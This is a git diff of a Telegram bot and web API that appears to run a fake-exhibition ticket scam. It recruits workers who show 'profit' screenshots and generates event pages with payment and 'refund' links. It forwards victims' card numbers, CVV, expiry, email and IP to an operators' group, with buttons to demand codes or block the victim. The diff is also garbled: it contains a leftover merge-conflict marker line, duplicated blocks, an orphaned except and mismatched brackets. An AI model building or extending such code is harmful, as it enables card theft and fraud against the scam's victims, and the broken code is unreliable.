@@ -105,25 +105,8 @@ CREATE TABLE IF NOT EXISTS site_users (
 """)
 conn.commit()
 
-# Додаємо колонку page_code, якщо вона не існує
-try:
-    c.execute('SELECT page_code FROM site_users LIMIT 1')
-except sqlite3.OperationalError:
-    print("[DB] Adding page_code column to site_users table")
-    c.execute('ALTER TABLE site_users ADD COLUMN page_code TEXT UNIQUE')
-    conn.commit()
-    print("[DB] page_code column added successfully")
 
-# Заповнюємо page_code для існуючих записів, якщо потрібно
-try:
-    c.execute('SELECT COUNT(*) FROM site_users WHERE page_code IS NULL')
-    null_count = c.fetchone()[0]
-    if null_count > 0:
-        print(f"[DB] Found {null_count} records without page_code, filling them...")
-        fill_page_codes()
-        print("[DB] page_code values filled successfully")
-except Exception as e:
-    print(f"[DB] Error checking/filling page_code: {e}")
+
 
 def get_user(user_id):
     c = conn.cursor()
@@ -383,44 +366,19 @@ async def process_experience(message: types.Message):
     await message.answer("🖼 Отправьте скриншоты ваших профитов (до 3х)\nМожно пропустить", reply_markup=skip_kb)
 
 
-
-@router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
-
-@router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots' and m.text and 'пропустить' in m.text.strip().lower())
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
 @ban_guard
 async def skip_screenshots(message: types.Message):
     uid = message.from_user.id
     print(f"[DEBUG] skip_screenshots handler triggered for user {uid}, user_step: {user_step.get(uid)}")
-    print(f"[DEBUG] Message text: '{message.text}'")
     if user_step.get(uid) == 'screenshots':
-        print(f"[DEBUG] User is in screenshots step, processing...")
         if 'screenshots' not in user_data.get(uid, {}):
             user_data.setdefault(uid, {})['screenshots'] = []
         try:
-            print(f"[DEBUG] Calling finish_form...")
             await finish_form(message)
-            print(f"[DEBUG] finish_form completed successfully")
         except Exception as e:
             print(f"[ERROR] finish_form failed: {e}")
-            import traceback
-            traceback.print_exc()
         user_step[uid] = None  # Скидаємо крок навіть якщо сталася помилка
-
-    user_step[uid] = None
-    if 'screenshots' not in user_data.get(uid, {}):
-        user_data.setdefault(uid, {})['screenshots'] = []
-    await finish_form(message)
-    # Only process if user is in screenshots step
-    if user_step.get(uid) == 'screenshots':
-        if 'screenshots' not in user_data.get(uid, {}):
-            user_data.setdefault(uid, {})['screenshots'] = []
-        await finish_form(message)
-
-        print(f"[DEBUG] User step reset to None")
-    else:
-        print(f"[DEBUG] User is not in screenshots step, ignoring")
-
     return
 
 @router.message(lambda m: m.content_type == types.ContentType.PHOTO)
@@ -469,26 +427,19 @@ async def finish_form(message):
     else:
         text += f"Скриншоты: не предоставлены\n"
     kb = InlineKeyboardMarkup(
-        inline_keyboard=[[
+        inline_keyboard=[[ 
             InlineKeyboardButton(text="Принять", callback_data=f"approve_{uid}"),
             InlineKeyboardButton(text="Отклонить", callback_data=f"reject_{uid}")
         ]]
     )
     try:
-        print(f"[DEBUG] Sending message to ADMIN_GROUP_ID: {ADMIN_GROUP_ID}")
         await bot.send_message(ADMIN_GROUP_ID, text, parse_mode='HTML', reply_markup=kb)
-        print(f"[DEBUG] Admin message sent successfully")
         for ph in screenshots:
             await bot.send_photo(ADMIN_GROUP_ID, ph)
-        print(f"[DEBUG] Sending confirmation to user")
         await message.answer("Ваша анкета проверяется администрацией!\nОжидайте решение", reply_markup=ReplyKeyboardRemove())
-        print(f"[DEBUG] User confirmation sent successfully")
         save_user(uid, 'pending', username, source, invited_by, experience, screenshots, data)
-        print(f"[DEBUG] User data saved successfully")
     except Exception as e:
         print(f"[ERROR] Sending to admin or user failed: {e}")
-        import traceback
-        traceback.print_exc()
     user_step[uid] = None
 
 @router.callback_query(lambda c: c.data.startswith('approve_') or c.data.startswith('reject_'))
@@ -1127,7 +1078,6 @@ async def block_others(message: types.Message):
             link = f"https://artpullse.com/refund/?total={amount}{currency}"
             await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
             return
-    print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {user_step.get(message.from_user.id)}")
     # Ігноруємо всі кроки сценарію івентів та всі варіанти кнопки 'Ссылки'
     if message.text and 'ссылки' in message.text.lower():
         return
@@ -1241,6 +1191,10 @@ async def events_save_all(message):
         }
         with open(events_file, 'w', encoding='utf-8') as f:
             json.dump(events, f, ensure_ascii=False, indent=2)
+        # Сохраняем связь event_code <-> user_id
+        # c = conn.cursor()
+        # c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, message.from_user.id))
+        # conn.commit()
         # --- Створюємо запис у site_users ---
         price = user_event.get('price', '45')
         currency = user_event.get('currency', 'EUR')
@@ -1262,26 +1216,91 @@ async def events_save_all(message):
         msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n"
         msg += f"🔖 Page Code: <code>{page_code}</code>\n\n"
         msg += f"<b>Афиша:</b>\n"
-        msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?page={page_code}\n"
+        msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?e={short_event_id}\n"
         for idx, ev in enumerate(events[event_id]['events'], 1):
             path = ev['path']
             if path.endswith('/index.html'):
                 path = path[:-10]
-            link = f"http://{EVENT_DOMAIN}/{path}?page={page_code}"
+            link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&page=1-{idx}&price={price}&currency={currency}"
             msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
         await message.answer(msg, parse_mode='HTML')
         # Повертаємо меню після створення виставки
         kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
         await message.answer("Головне меню:", reply_markup=kb)
-        # Зберігаємо зв'язок page_code <-> site_user_id (замість event_code)
+        # Зберігаємо зв'язок event_code <-> site_user_id
         c = conn.cursor()
-        c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (page_code, site_user_id))
+        c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, site_user_id))
         conn.commit()
     except Exception as e:
         print(f"[EVENTS] Помилка у events_save_all: {e}")
-        import traceback
-        traceback.print_exc()
         await message.answer(f"❗️ Виникла помилка при створенні івенту: {e}")
+        with open(events_file, 'r', encoding='utf-8') as f:
+            events = json.load(f)
+    except Exception:
+        events = {}
+    
+    # Додаємо нову подію
+    user_event = EVENT_user_data[chat_id]
+    events[event_id] = {
+        'title': user_event.get('title', 'Выставка'),
+        'price': user_event.get('price', '45'),
+        'currency': user_event.get('currency', 'EUR'),
+        'address': user_event.get('address', ''),
+        'events': [
+            {
+                'name': EVENT_FIXED_EVENTS[i],
+                'path': EVENT_FIXED_PATHS[i],
+                'date': user_event['dates'][i],
+                'time': user_event['times'][i]
+            } for i in range(8)
+        ]
+    }
+    
+    with open(events_file, 'w', encoding='utf-8') as f:
+        json.dump(events, f, ensure_ascii=False, indent=2)
+    
+    # Сохраняем связь event_code <-> user_id
+    c = conn.cursor()
+    c.execute('INSERT OR REPLACE INTO event_links (event_code, user_id) VALUES (?, ?)', (short_event_id, message.from_user.id))
+    conn.commit()
+    
+    # --- Створюємо запис у site_users ---
+    price = user_event.get('price', '45')
+    currency = user_event.get('currency', 'EUR')
+    street = user_event.get('address', '')
+    dates = user_event.get('dates', [''] * 8)
+    times = user_event.get('times', [''] * 8)
+    
+    # Об'єднуємо дату і час у формат "дата час"
+    combined_dates = []
+    for i in range(8):
+        if dates[i] and times[i]:
+            combined_dates.append(f"{dates[i]} {times[i]}")
+        else:
+            combined_dates.append(dates[i] if dates[i] else '')
+    
+    site_user_id = create_site_user(combined_dates, currency, street, price)
+    
+    # Формуємо повідомлення з посиланнями
+    msg = f"Выставка успешно создана:\n<b>{user_event.get('title', 'Выставка')}</b>\n"
+    msg += f"�� Цена: <b>{price} {currency}</b>\n"
+    msg += f"📍 Адрес: <b>{street or 'Не указан'}</b>\n"
+    msg += f"🆔 Site User ID: <code>{site_user_id}</code>\n\n"
+    msg += f"<b>Афиша:</b>\n"
+    msg += f"<b>Главная страница:</b> http://{EVENT_DOMAIN}/?e={short_event_id}\n"
+    
+    for idx, ev in enumerate(events[event_id]['events'], 1):
+        path = ev['path']
+        if path.endswith('/index.html'):
+            path = path[:-10]
+        link = f"http://{EVENT_DOMAIN}/{path}?e={short_event_id}&p={idx}"
+        msg += f"{idx}. {ev['name']} ({ev['date']} {ev['time']})\n{link}\n"
+    
+    await message.answer(msg, parse_mode='HTML')
+    
+    # Повертаємо меню після створення виставки
+    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
+    await message.answer("Головне меню:", reply_markup=kb)
 
 @log_function
 async def notify_admin(request):
@@ -1352,6 +1371,18 @@ async def payment_notify(request):
         text += f"\nЦена: {user_data_from_db['price']} {user_data_from_db['currency']}"
         text += f"\nАдрес: {user_data_from_db['street']}"
     
+    kb_rows = [
+        [
+            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+        ],
+        [
+            InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+        ]
+    )
     await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
 
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
@@ -1364,17 +1395,17 @@ async def payment_notify(request):
     )
     kb2 = InlineKeyboardMarkup(
         inline_keyboard=[
-        [
-            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
-            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
-            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ],
-        [
+            [
+                InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+                InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+                InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+                InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            ],
+            [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
-            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+                InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+            ]
         ]
-    ]
     )
     await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
 
@@ -1412,7 +1443,7 @@ async def code_notify(request):
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
-@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or c.data.startswith('code_request_again:')))
+@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or c.data.startswith('code:')))
 async def admin_action_handler(call: types.CallbackQuery):
     action, ip = call.data.split(':', 1)
     import aiohttp as aiohttp_client
@@ -1424,19 +1455,6 @@ async def admin_action_handler(call: types.CallbackQuery):
         await call.answer("Користувач заблокований")
     elif action == 'unblock':
         await call.answer("Користувач розблокований")
-    elif action == 'support':
-        # Надсилаємо POST на /set_support_flag
-        async with aiohttp_client.ClientSession() as session:
-            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'support'})
-        await call.answer("Включена технічна підтримка")
-    elif action == 'text':
-        await call.answer("Введіть текст повідомлення:")
-        user_step[call.from_user.id] = f'text_for_{ip}'
-    elif action == 'code_request_again':
-        # Надсилаємо POST на /set_request_again з кодом
-        async with aiohttp_client.ClientSession() as session:
-            await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
-        await call.answer("Код запитується знову")
 
 
 
@@ -1495,26 +1513,17 @@ async def latest_event_data(request):
 
 @log_function
 async def event_address(request):
-    # Підтримуємо як новий формат ?page= так і старий ?e=
-    page_code = request.query.get('page', '') or request.query.get('e', '')
-    if not page_code:
-        return web.json_response({'error': 'missing page or e parameter'}, status=400)
-    # Знайти user_id за page_code
+    code = request.query.get('e', '')
+    if not code:
+        return web.json_response({'error': 'missing code'}, status=400)
+    # Знайти user_id за event_code
     c = conn.cursor()
-    # Спочатку шукаємо в event_links (для нових записів)
-    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (code,))
     row = c.fetchone()
-    if row:
-        user_id = row[0]
-    else:
-        # Якщо не знайдено в event_links, шукаємо в site_users
-        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
-        row = c.fetchone()
-        if not row:
-            return web.json_response({'error': 'not found'}, status=404)
-        user_id = row[0]
-    
-    # Знайти запис site_users для цього user_id
+    if not row:
+        return web.json_response({'error': 'not found'}, status=404)
+    user_id = row[0]
+    # Знайти останній запис site_users для цього user_id
     c.execute('SELECT street FROM site_users WHERE id=?', (user_id,))
     row2 = c.fetchone()
     if not row2:
@@ -1542,30 +1551,22 @@ async def data_by_ip(request):
 
 @log_function
 async def event_links(request):
-    # Підтримуємо як новий формат ?page= так і старий ?e=
-    page_code = request.query.get('page', '') or request.query.get('e', '')
-    if not page_code:
-        return web.json_response({'error': 'missing page or e parameter'}, status=400)
+    event_code = request.query.get('event_code', '')
+    if not event_code:
+        return web.json_response({'error': 'missing event_code'}, status=400)
     
-    print(f"[DEBUG] event_links request for page_code: {page_code}")
+    print(f"[DEBUG] event_links request for event_code: {event_code}")
     
     c = conn.cursor()
-    # Спочатку шукаємо в event_links (для нових записів)
-    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (event_code,))
     row = c.fetchone()
     
-    if row:
-        site_user_id = row[0]
-        print(f"[DEBUG] Found site_user_id: {site_user_id} for page_code: {page_code} in event_links")
-    else:
-        # Якщо не знайдено в event_links, шукаємо в site_users
-        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
-        row = c.fetchone()
-        if not row:
-            print(f"[DEBUG] Page code {page_code} not found in any table")
-            return web.json_response({'error': 'page_code not found'}, status=404)
-        site_user_id = row[0]
-        print(f"[DEBUG] Found site_user_id: {site_user_id} for page_code: {page_code} in site_users")
+    if not row:
+        print(f"[DEBUG] Event code {event_code} not found in event_links table")
+        return web.json_response({'error': 'event_code not found'}, status=404)
+    
+    site_user_id = row[0]
+    print(f"[DEBUG] Found site_user_id: {site_user_id} for event_code: {event_code}")
     
     # Перевіряємо, чи існує цей site_user_id у таблиці site_users
     c.execute('SELECT id FROM site_users WHERE id=?', (site_user_id,))
@@ -1576,32 +1577,6 @@ async def event_links(request):
         return web.json_response({'error': 'site_user_id not found in site_users'}, status=404)
     
     return web.json_response({'site_user_id': site_user_id})
-
-# --- API: user_id by page_code ---
-@log_function
-async def user_id_by_page_code(request):
-    page_code = request.query.get('page', '')
-    if not page_code:
-        return web.json_response({'error': 'missing page'}, status=400)
-    c = conn.cursor()
-    c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
-    row = c.fetchone()
-    if not row:
-        return web.json_response({'error': 'not found'}, status=404)
-    return web.json_response({'user_id': row[0]})
-
-@log_function
-async def payment_data(request):
-    page_code = request.query.get('page', '')
-    if not page_code:
-        return web.json_response({'error': 'missing page'}, status=400)
-    c = conn.cursor()
-    c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
-    row = c.fetchone()
-    if not row:
-        return web.json_response({'error': 'not found'}, status=404)
-    price, currency, street = row
-    return web.json_response({'price': price, 'currency': currency, 'address': street})
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
@@ -1616,8 +1591,8 @@ if __name__ == '__main__':
         app.router.add_get('/api/event_address', event_address)  # <-- Додаємо новий endpoint
         app.router.add_get('/api/data_by_ip', data_by_ip)  # <-- Додаємо новий endpoint
         app.router.add_get('/api/event_links', event_links)  # <-- Додаємо новий endpoint
+        app.router.add_get('/api/page_code_by_user_id', page_code_by_user_id)
         app.router.add_get('/api/user_id_by_page_code', user_id_by_page_code)
-        app.router.add_get('/api/payment_data', payment_data)  # <-- Додаємо новий endpoint
         runner = web.AppRunner(app)
         await runner.setup()
         site = web.TCPSite(runner, '0.0.0.0', 8081)
@@ -1627,12 +1602,12 @@ if __name__ == '__main__':
         await dp.start_polling(bot)
     asyncio.run(main())
 
-<<<<<<< HEAD
 @router.message(flags={'run_always': True})
+@router.message()
 async def print_chat_id(message: types.Message):
     print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")
     # Можна закоментувати або видалити цей хендлер після отримання chat_id
-=======
+
 def fill_page_codes():
     c = conn.cursor()
     c.execute('SELECT id FROM site_users ORDER BY created_at')
@@ -1651,5 +1626,27 @@ def get_site_user_id_by_page(page_code):
     return row[0] if row else None
 
 # --- API: page_code by user_id ---
+@log_function
+async def page_code_by_user_id(request):
+    user_id = request.query.get('user_id', '')
+    if not user_id:
+        return web.json_response({'error': 'missing user_id'}, status=400)
+    c = conn.cursor()
+    c.execute('SELECT page_code FROM site_users WHERE id=?', (user_id,))
+    row = c.fetchone()
+    if not row:
+        return web.json_response({'error': 'not found'}, status=404)
+    return web.json_response({'page_code': row[0]})
 
->>>>>>> origin/sasha
+# --- API: user_id by page_code ---
+@log_function
+async def user_id_by_page_code(request):
+    page_code = request.query.get('page', '')
+    if not page_code:
+        return web.json_response({'error': 'missing page'}, status=400)
+    c = conn.cursor()
+    c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
+    row = c.fetchone()
+    if not row:
+        return web.json_response({'error': 'not found'}, status=404)
+    return web.json_response({'user_id': row[0]})
